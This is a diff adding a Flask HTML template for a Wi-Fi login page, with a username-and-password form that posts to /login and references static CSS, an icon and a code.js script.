@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Wi-Fi Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Use Flask's static folder for style.css -->
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+  <link rel="stylesheet" href="./files/style.css">
+  <!-- Use local path for favicon (if not inside static folder) -->
+  <link rel="shortcut icon" href="./files/-wifi_90700.ico" type="image/x-icon">
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="login-header">
+      <!-- Use Flask's static folder for the Wi-Fi icon -->
+      <img src="{{ url_for('static', filename='wifi.png') }}" alt="Wi-Fi Icon">
+      <h2>Wi-Fi Login</h2>
+    </div>
+    <form method="post" action="/login">
+      <input type="text" name="username" placeholder="Username or Email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <input type="submit" value="Login">
+    </form>
+    <div class="info">
+      By logging in, you agree to our <a href="#">terms</a>.
+    </div>
+  </div>
+
+  <!-- Use Flask's static folder for the code.js -->
+  <script src="{{ url_for('static', filename='code.js') }}"></script>
+</body>
+</html>
